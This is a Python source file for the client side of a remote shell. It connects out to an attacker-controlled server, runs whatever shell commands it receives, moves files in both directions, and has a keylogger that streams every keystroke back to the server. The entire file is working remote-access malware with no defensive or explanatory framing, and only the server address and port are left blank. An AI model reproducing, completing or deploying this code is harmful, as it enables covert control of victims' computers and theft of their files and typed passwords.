#!/usr/bin/python
# Remote Shell Client

# Description:
# This script serves as the client-side counterpart to the Remote Shell server. It connects to the server
# and allows the execution of commands, file operations, and includes a keylogger feature.

import socket
import threading
import time
import json
import subprocess
import os
from pynput import keyboard

l_host =  # Server IP
l_port =  # Server PORT


# Function to capture keys for the keylogger
def capture_keys(key):
    if keylogger_active:
        try:
            # [*] check 'vk': 65437 bug
            # key_attributes = dir(key)
            # for attributes in key_attributes:
            #     if not callable(getattr(key, attributes)):
            #         pr = getattr(key, attributes)
            #         if isinstance(pr, dict):
            #             print("\n", pr)
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            elif hasattr(key, 'char'):
                char = key.char
                # There's a bug when pressing numpy 5 on linux systems
                # {'vk': 65437, 'char': None, 'is_dead': False, 'combining': None, '_symbol': None}
                if key.vk == 65437:
                    char = "5"
            else:
                char = getattr(key, 'char')  # Use 'char' if
            print(char, end='', flush=True)
            server.send(char.encode())
        except Exception as e_cap_key:
            print(f"\ndef [capture_keys] Error:\n{e_cap_key}")
    else:
        listener.stop()


# Function to send data to the server
def send_data_as_json(data, target_socket):
    json_data = json.dumps(data)
    target_socket.send(json_data.encode())


# Function to receive data from the server
def receive_data_as_json(target_socket):
    global json_receive_timeout
    received_data = ''
    while True:
        if json_receive_timeout == 25:
            break
        try:
            received_data += target_socket.recv(1024).decode().rstrip()
            return json.loads(received_data)
        except json.JSONDecodeError:
            # Handle invalid JSON data if needed
            json_receive_timeout += 1
            continue


# Function to upload a file to the server
def upload_file(file_name):
    try:
        with open(file_name, 'rb') as up_file:
            server.send(up_file.read())
    except Exception as e_upload_file:
        print(f"Error uploading file: {e_upload_file}")


# Function to download a file from the server
def download_file(file_name):
    try:
        with open(file_name, 'wb') as down_file:
            server.settimeout(1)
            while True:
                chunk = server.recv(1024)
                if not chunk:
                    break
                down_file.write(chunk)
    except socket.timeout:
        pass  # Ignore timeouts
    except Exception as e_download_file:
        print(f"Error downloading file: {e_download_file}")
    finally:
        server.settimeout(None)


# Function to handle incoming commands from the server
def main():
    global keylogger_active
    global active_keylogger_loop
    global connection_died
    global timeout
    while True:
        try:
            command = receive_data_as_json(server)
            if command == 'quit':
                connection_died = 1
                break
            elif command == '':
                timeout += 1
                time.sleep(0.25)
                if timeout == 15:
                    connection_died = 1
                    break
            elif command == 'clear':
                pass

            elif command[:3] == 'cd ':
                os.chdir(command[3:])

            elif command == 'keyscan_start':
                keylogger_active = True
                active_keylogger_loop = 0
                print("Keylogger started.")
            elif command == 'keyscan_stop':
                keylogger_active = False
                print("Keylogger stopped.")

            elif command.startswith('download'):
                # upload to server
                upload_file(command[9:])
            elif command.startswith('upload'):
                # download from server
                download_file(command[7:])

            else:
                # Execute the command and capture the output
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                # Send the result back to the server
                time.sleep(1)
                send_data_as_json(result, server)

        except Exception as e_main:
            print(f"\ndef[Main] Error:\n{e_main}")
            connection_died = 1
            break


if __name__ == "__main__":
    connection_died = 0
    timeout = 0
    json_receive_timeout = 0
    keylogger_active = False
    active_keylogger_loop = 0

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[•] waiting for connection")
    while True:
        try:
            server.connect((l_host, l_port))
            print("[+] Connected!")
            break
        except TimeoutError:
            print('[!] Connection timed out, retrying in 10 seconds...')
            time.sleep(5)
        except Exception as e_connect:
            print(f'[!] An error occurred: {e_connect}')
            time.sleep(5)

    main_tread = threading.Thread(target=main)
    main_tread.start()

    while True:
        try:
            if connection_died == 1:
                print("\n[!] connection died. exit in 3 sec")
                time.sleep(3)
                exit(0)

            if active_keylogger_loop == 0:
                while keylogger_active:
                    listener = keyboard.Listener(on_press=capture_keys)
                    listener.start()
                    active_keylogger_loop = 1
                    break
            time.sleep(1)

        except KeyboardInterrupt:
            continue
        except Exception as e_main_loop:
            print(f"__main__ [Main loop]:\n{e_main_loop}")
            exit(0)
